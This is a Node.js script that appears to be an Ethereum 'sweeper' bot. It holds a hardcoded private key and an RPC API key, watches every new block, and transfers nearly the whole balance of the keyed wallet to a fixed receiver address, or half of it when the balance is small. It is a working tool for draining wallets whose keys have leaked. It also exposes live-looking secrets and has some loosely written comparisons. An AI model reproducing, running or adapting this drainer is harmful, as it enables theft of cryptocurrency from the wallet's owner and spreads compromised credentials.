const { ethers } = require('ethers')

const provider = new ethers.providers.JsonRpcProvider("https://speedy-nodes-nyc.moralis.io/cb392e14ff1f48151f0afa6a/eth/mainnet")

const { multiply } = require('mathjs')


const addressReceiver = '0x1Be72C174D1A0Af38cd552f7064BAd726c767C83'

const privateKeys = ["bcadb8a4edaeaf7fbd7a4d4b712ca54bdf7f7e6bac9129f28dd94a0662fd240e"]

const bot = async =>{
    provider.on('block', async () => {
        console.log('Listening to new block, waiting ;)');
        let totalCostInIntWithFee;
        for (let i = 0; i < privateKeys.length; i++) {

            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);

            const gasPrice = await provider.getGasPrice();
            //estimate gas for transfer of all balance
            const gasLimit = await target.estimateGas({
                to: addressReceiver,
                value: balance
            });


            console.log(gasLimit);
            //calculate total cost of transfer
            const totalCost = gasPrice.mul(gasLimit);
            //convert total cost to ether
            const totalCostInEther = ethers.utils.formatEther(totalCost);

            console.log(`The fee in eth as of this block is ${totalCostInEther}`);
            const balanceInEth = ethers.utils.formatEther(balance);
            //convert totalCostInEther to int
            const totalCostInInt = Number(totalCostInEther);
            const totalCostInIntWithFee = multiply(totalCostInInt, 2);
            console.log(totalCostInIntWithFee);
            const balanceInInt = totalCostInIntWithFee.toString()
            const rounded = totalCostInIntWithFee.toFixed(5)
            console.log(rounded);
            const txBuffer = ethers.utils.parseEther(rounded);
            console.log(txBuffer);
            if (balance.sub(txBuffer) > 0){
                console.log("New Account with Eth!");
                const amount = balance.sub(txBuffer);

                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: amount


                    });
                    console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
            if (balance > 0 && balanceInEth < 0.00151 && balanceInEth > 0.0001){
                console.log("New Account with Eth less than 0.005!");



                const halfBalance = balance.div(2);
                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: halfBalance
                    });
                    console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
                } catch(e){
                    console.log(`error: ${e}`);
                }

            }
        }
    })
}
bot();
